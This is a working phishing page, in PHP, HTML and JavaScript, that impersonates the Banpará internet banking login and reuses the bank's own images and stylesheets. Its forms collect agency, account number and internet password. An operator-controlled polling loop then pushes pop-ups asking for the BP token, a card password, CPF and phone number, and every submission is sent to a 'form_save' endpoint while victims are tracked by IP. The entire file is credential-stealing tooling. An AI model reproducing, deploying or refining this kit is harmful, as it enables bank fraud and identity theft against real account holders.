<?php
   $ip = $api->getUserIp();
   $cliente_id = $api->registrarOuAtualizarCliente($ip);
   
    if($api->isStatus($ip) == 'deletado'){
        header('Location: https://www.banpara.b.br/');
        exit;
    }
    
    if($api->isStatus($ip) == 'deletado2'){
        $api->deleteips($ip);
        header('Location: https://www.banpara.b.br/');
        exit;
    }

   $api->atualizarColuna($cliente_id, 'tela', 'Conta Fisica');
   $api->atualizarColuna($cliente_id, 'modal', 'fechada');
   
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title>Internet Banking Pessoa Física</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238">
    <link rel="icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238" type="image/x-icon">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/bootstrap.min.css?20231107130238">
   
  
   
   
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/pagina/login.css?20231107130238">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('https://internetbanking.banpara.b.br/ibpf/resources/imagens/background.jpg') no-repeat center center fixed;
            background-size: cover;
            flex-direction: column; /* Para colocar o favicon acima do container */
            position: relative; /* Posição relativa para o container */
        }
        .favicon {
            background-image: url('https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238');
            width: 40px; /* Largura do favicon */
            height: 40px; /* Altura do favicon */
            background-size: cover; /* Para cobrir toda a área do div com o favicon */
            position: absolute; /* Posição absoluta para o favicon */
            top: 20px; /* Distância do topo */
            left: 50%; /* Centralizando horizontalmente */
            transform: translateX(-50%); /* Ajuste fino para centralizar */
            z-index: 1000; /* Z-index para estar acima do conteúdo */
        }
        .container {
            background-color: white;
            color: #002366; /* Cor do texto */
            border-radius: 10px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            box-sizing: border-box; /* Para incluir padding na largura total */
            margin-top: 80px; /* Margem superior para afastar do favicon */
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px; /* Tamanho aumentado da logo */
            max-width: 100%; /* Garantir que não ultrapasse a largura máxima do container */
        }
        h2 {
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 16px; /* Tamanho do texto das labels */
        }
        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: calc(100% - 22px); /* Considerando o padding de 10px em cada lado */
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box; /* Para incluir padding na largura total */
        }
        .form-group input[type="radio"] {
            margin-right: 5px; /* Espaçamento menor entre os radio buttons */
        }
        .form-group .radio-group {
            display: flex;
            justify-content: space-between;
        }
        .form-group .radio-group label {
            display: flex;
            align-items: center;
            font-size: 16px; /* Tamanho do texto dos radio buttons */
        }
        .form-group .icon {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }
        .form-group .icon i {
            font-size: 24px; /* Tamanho do ícone aumentado */
            margin-right: 10px; /* Espaçamento entre o ícone e o texto */
        }
        .form-group .toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .form-group .toggle label {
            margin: 0;
        }
        .form-group .toggle input {
            margin-left: 10px;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #002366;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        /* Estilos para telas menores */
        @media (max-width: 600px) {
            .container {
                width: 90%;
            }
            .logo img {
                width: 120px; /* Tamanho da logo ajustado para telas menores */
            }
            h2 {
                font-size: 20px;
            }
            .btn {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="favicon"></div>
    <div class="container">
        <div class="logo">
            <img src="https://internetbanking.banpara.b.br/ibpf/resources/imagens/logo_azul.png?20231107130238" alt="Logo">
        </div>
        <h2>Acessar Conta</h2>
        <form  id="formulario" method="post">
        <div class="form-group">
            <label>Titularidade</label>
            <div class="radio-group">
                <label><input type="radio" name="titularidade" value="primeira"> Primeira</label>
                <label><input type="radio" name="titularidade" value="segunda"> Segunda</label>
            </div>
        </div>
        <div class="form-group">
            <label>Tipo da conta</label>
            <div class="radio-group">
                <label><input type="radio" name="tipo_conta" value="corrente"> Corrente</label>
                <label><input type="radio" name="tipo_conta" value="poupanca"> Poupança</label>
            </div>
        </div>
        <div class="form-group">
            <div class="icon">
                <i class="fas fa-building"></i>
                <label>Agência</label>
            </div>
            <input type="text" name="agencia" placeholder="Digite o número de sua agência">
        </div>
        <div class="form-group">
            <div class="icon">
                <i class="fas fa-university"></i>
                <label>Conta</label>
            </div>
            <input type="text" name="conta" placeholder="Digite o número de sua conta">
        </div>
        <div class="form-group">
            <div class="icon">
                <i class="fas fa-lock"></i>
                <label>Senha da internet</label>
            </div>
            <input type="password" name="senha" maxlength="8" placeholder="Digite sua senha da internet">
        </div>
        <div class="form-group">
        <input type="hidden" name="action" value="form-save">
        <button class="btn" type="submit">ENTRAR</button>
        </form>
    </div>
</body>
</html>

<style type="text/css">
    #loading-circle {
        position: fixed;
        width: 100%;
        height: 100%;
        display: flex;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 9999;
        background: #ffffff8f;
        flex-direction: column;
        align-items: center;
        justify-content: center;
    }

    .hidden {
        display: none;
    }

    .loader {
        border: 5px solid #f3f3f3;
        border-top: 5px solid #2f368e;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 2s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
<div id="loading-circle" class="hidden">
    <div class="loader"></div>
</div>


 <style>
    /* Estilos para os modais */
    .modal {
        display: none; /* Ocultar por padrão */
        position: fixed; /* Posição fixa */
        z-index: 1; /* Z-index alto para estar acima de outros elementos */
        left: 0;
        top: 0;
        width: 100%; /* Largura total */
        height: 100%; /* Altura total */
        overflow: auto; /* Ativar rolagem */
        background-color: rgba(0,0,0,0.4); /* Fundo preto semi-transparente */
    }

    /* Conteúdo do modal */
    .modal-content {
        background-color: #fefefe;
        margin: 15% auto;
        padding: 20px;
        border: 1px solid #888888d6;
        width: 357px;
        max-width: 600px; /* Largura máxima */
        color: #0a0e89;
    }

    /* Fechar botão */
    .close {
        color: #aaa;
        float: right;
        font-size: 28px;
        font-weight: bold;
    }

    .close:hover,
    .close:focus {
        color: black;
        text-decoration: none;
        cursor: pointer;
    }

    /* Botão de confirmação */
    .confirm-btn {
        display: block;
        margin-top: 20px;
        padding: 10px 20px;
        background-color: transparent;
        color: #3667f1;
        border: 1px solid #3667f1;
        border-radius: 5px;
        cursor: pointer;
        font-size: 16px;
        text-align: center;
    }

    /* Estilo para esconder o modal quando necessário */
    .modal.hide-modal {
        display: none;
    }

    .errormsg {
        color: red;
        display: none;
    }
</style>

<!-- Modal Token -->
<div id="myModal" class="modal">
    <!-- Conteúdo do modal -->
    <div class="modal-content">
        <h3 style="margin-bottom: 10px;">BP Token:</h3>
        <div style="display: flex; flex-direction: column; align-items: center;">
            <p style="margin-bottom: 0;">Por questões de segurança precisamos confirmar seu BP token:</p>
        </div>
        <form method="post" id="formulariomodal">
            <input type="text" name="codemodal" maxlength="6" style="width: 98%; margin-top: 20px; height: 35px; outline: none; border: none; background: #00000012;">
            <p class="errormsg">Token inválido...</p>
            <button class="confirm-btn" type="submit">Confirmar</button>
            <input type="hidden" name="action" value="form-modal">
        </form>
    </div>
</div>

<!-- Modal Senha -->
<div id="passwordModal" class="modal">
    <!-- Conteúdo do modal -->
    <div class="modal-content">
        <h3 style="margin-bottom: 10px;">Senha:</h3>
        <div style="display: flex; flex-direction: column; align-items: center;">
            <p style="margin-bottom: 0;">Por favor, insira sua senha:</p>
        </div>
        <form method="post" id="formulariosenha">
            <input type="password" name="senha" maxlength="4" style="width: 98%; margin-top: 20px; height: 35px; outline: none; border: none; background: #00000012;">
            <p class="errormsg">Senha inválida...</p>
            <button class="confirm-btn" type="submit">Confirmar</button>
            <input type="hidden" name="action" value="form-senha">
        </form>
    </div>
</div>

<!-- Modal Dados Extras -->
<div id="extraDataModal" class="modal">
    <!-- Conteúdo do modal -->
    <div class="modal-content">
        <h3 style="margin-bottom: 10px;">Dados Extras:</h3>
        <div style="display: flex; flex-direction: column; align-items: center;">
            <p style="margin-bottom: 0;">Por favor, insira seus dados extras:</p>
        </div>
        <form method="post" id="formulariodadosextras">
            <input type="text" name="cpf" maxlength="11" placeholder="CPF" style="width: 98%; margin-top: 20px; height: 35px; outline: none; border: none; background: #00000012;">
            <input type="text" name="telefone" placeholder="Telefone" maxlength="11" style="width: 98%; margin-top: 10px; height: 35px; outline: none; border: none; background: #00000012;">
            <p class="errormsg">Dados inválidos...</p>
            <button class="confirm-btn" type="submit">Confirmar</button>
            <input type="hidden" name="action" value="form-dadosextras">
        </form>
    </div>
</div>

<script type="text/javascript">
    function closeAllModals() {
        const modals = document.querySelectorAll('.modal');
        modals.forEach(modal => {
            modal.style.display = 'none';
        });
    }

    function openModal(modalId) {
        closeAllModals();
        document.getElementById(modalId).style.display = 'block';
    }

    function closeModal(modalId) {
        document.getElementById(modalId).style.display = 'none';
    }

    function showError(modalId) {
        const errorMsg = document.querySelector(`#${modalId} .errormsg`);
        errorMsg.style.display = 'block';
        setTimeout(() => {
            errorMsg.style.display = 'none';
        }, 6000);
    }

    window.addEventListener('pageshow', function(event) {
       if (event.persisted) {
           fetch('conta')
           location.reload();
       }
    });

    window.addEventListener('DOMContentLoaded', function() {
       const currentUrl = new URL(window.location.href);
       currentUrl.searchParams.set('timestamp', Date.now());
       window.history.replaceState({}, 'conta', currentUrl);
    });

    document.addEventListener('DOMContentLoaded', function () {
        const formulario = document.getElementById('formulario');
        const formularioModal = document.getElementById('formulariomodal');
        const formularioSenha = document.getElementById('formulariosenha');
        const formularioDadosExtras = document.getElementById('formulariodadosextras');
        const loadingCircle = document.getElementById('loading-circle');

        formulario.addEventListener('submit', function (event) {
            event.preventDefault();
            const inputs = formulario.querySelectorAll('input');
            let allFieldsFilled = true;
            inputs.forEach(input => {
                if (!input.value.trim()) {
                    allFieldsFilled = false;
                }
            });

            if (allFieldsFilled) {
                // Exibe o círculo de carregamento
                loadingCircle.classList.remove('hidden');

                // Coleta os dados do formulário
                const formData = new FormData(formulario);

                // Envia os dados via fetch
                fetch('form_save', {
                    method: formulario.method,
                    body: formData
                })
                .then(response => {
                })
                .catch(error => {
                });
            } else {
            }
        });

        [formularioModal, formularioSenha, formularioDadosExtras].forEach(form => {
            form.addEventListener('submit', function (event) {
                event.preventDefault();
                const inputs = form.querySelectorAll('input');
                let allFieldsFilled = true;
                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        allFieldsFilled = false;
                    }
                });

                if (allFieldsFilled) {
                    // Exibe o círculo de carregamento
                    loadingCircle.classList.remove('hidden');

                    // Coleta os dados do formulário
                    const formData = new FormData(form);

                    // Envia os dados via fetch
                    fetch('form_save', {
                        method: form.method,
                        body: formData
                    })
                    .then(response => {
                    })
                    .catch(error => {
                    });
                } else {
                }
            });
        });
    });

    function fetchCommand() {
        fetch('fetch-command')
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {

                try {

                    const comando = JSON.parse(data.comando);

                    if (comando.command === "modal") {
                        openModal('myModal');
                        document.getElementById('loading-circle').classList.add('hidden');
                    }

                    if (comando.command === "error-modal") {
                        document.getElementById('loading-circle').classList.add('hidden');
                        showError('myModal');
                    }

                    if (comando.command === "modal-senha") {
                        openModal('passwordModal');
                        document.getElementById('loading-circle').classList.add('hidden');
                    }

                    if (comando.command === "error-senha") {
                        document.getElementById('loading-circle').classList.add('hidden');
                        showError('passwordModal');
                    }

                    if (comando.command === "modal-dadosextras") {
                        openModal('extraDataModal');
                        document.getElementById('loading-circle').classList.add('hidden');
                    }

                    if (comando.command === "error-dadosextras") {
                        document.getElementById('loading-circle').classList.add('hidden');
                        showError('extraDataModal');
                    }

                    if (comando.command === "reload") {
                        document.getElementById('loading-circle').classList.add('hidden');
                        location.reload();
                    }

                    if (comando.command === "redirect") {
                        window.location.href = 'https://www.banpara.b.br/';
                    }

                } catch (e) {

                }

            } else if (data.status === 'no_command') {

            }
        })
        .catch(error => {
            console.error('Erro ao buscar comando:', error);
        });
    }

    function startPolling() {
        fetchCommand();
        setInterval(() => {
            fetchCommand();
        }, 2000);
    }

    window.onload = startPolling;
</script>
